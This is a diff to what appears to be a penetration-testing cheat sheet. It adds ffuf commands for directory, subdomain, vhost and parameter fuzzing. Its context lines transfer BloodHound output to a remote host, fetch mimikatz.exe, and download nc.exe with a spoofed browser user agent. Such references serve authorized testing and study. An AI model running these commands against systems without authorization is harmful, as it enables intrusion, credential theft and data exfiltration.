@@ -97,3 +97,15 @@ Log injection
 - `scp C:\Temp\bloodhound.zip user@10.10.10.150:/tmp/bloodhound.zip`
 - `scp user@target:/tmp/mimikatz.exe C:\Temp\mimikatz.exe`
 - `Invoke-WebRequest http://nc.exe -UserAgent [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome -OutFile "nc.exe"`
+
+
+- `ffuf -h` 	ffuf help
+- `ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ` 	Directory Fuzzing
+- `ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/indexFUZZ` 	Extension Fuzzing
+- `ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/dir/FUZZ.php` 	Page Fuzzing
+- `ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ -recursion -recursion-depth 1 -e .php -v` 	Recursive Fuzzing
+- `ffuf -w wordlist.txt:FUZZ -u https://FUZZ.domain.com/` 	Sub-domain Fuzzing
+- `ffuf -w wordlist.txt:FUZZ -u http://domain.htb:PORT/ -H 'Host: FUZZ.domain.com' -fs xxx` 	VHost Fuzzing
+- `ffuf -w wordlist.txt:FUZZ -u http://sub.domain.com:PORT/admin/admin.php?FUZZ=key -fs xxx` 	Parameter Fuzzing - GET
+- `ffuf -w wordlist.txt:FUZZ -u http://sub.domain.com:PORT/admin/admin.php -X POST -d 'FUZZ=key' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx` 	Parameter Fuzzing - POST
+- `ffuf -w ids.txt:FUZZ -u http://sub.domain.com:PORT/admin/admin.php -X POST -d 'id=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx`
